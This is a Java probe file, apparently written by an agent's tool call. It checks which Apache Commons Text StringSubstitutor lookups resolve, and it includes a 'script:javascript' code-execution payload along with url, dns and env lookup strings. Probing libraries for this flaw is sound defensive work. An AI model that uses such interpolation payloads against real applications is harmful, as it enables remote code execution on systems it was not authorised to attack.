{"path":"/tmp/probe/Probe.java","content":"import org.apache.commons.text.StringSubstitutor;

public class Probe {
    public static void main(String[] args) {
        StringSubstitutor s = StringSubstitutor.createInterpolator();
        String[] cases = {
            "${sys:probe.expected}",
            "${script:javascript:java.lang.System.out.println('RCE-VIA-SCRIPT')}x",
            "${url:UTF-8:http://127.0.0.1:9/does-not-exist}",
            "${dns:address|localhost}",
            "${java:version}",
            "${env:PATH}",
            "${const:java.awt.Toolkit.SCREEN_MENU}",
            "${date:yyyy}",
        };
        System.out.println("commons-text impl: "
            + StringSubstitutor.class.getProtectionDomain().getCodeSource().getLocation());
        for (String c : cases) {
            String out;
            try {
                out = s.replace(c);
            } catch (Throwable t) {
                out = "<threw " + t.getClass().getName() + ">";
            }
            boolean resolved = !out.equals(c);
            System.out.printf("%-58s -> %-30s resolved=%s%n",
                truncate(c, 58), truncate(out, 30), resolved);
        }
    }
    static String truncate(String s, int n) { return s.length() <= n ? s : s.substring(0, n - 3) + "..."; }
}
"}

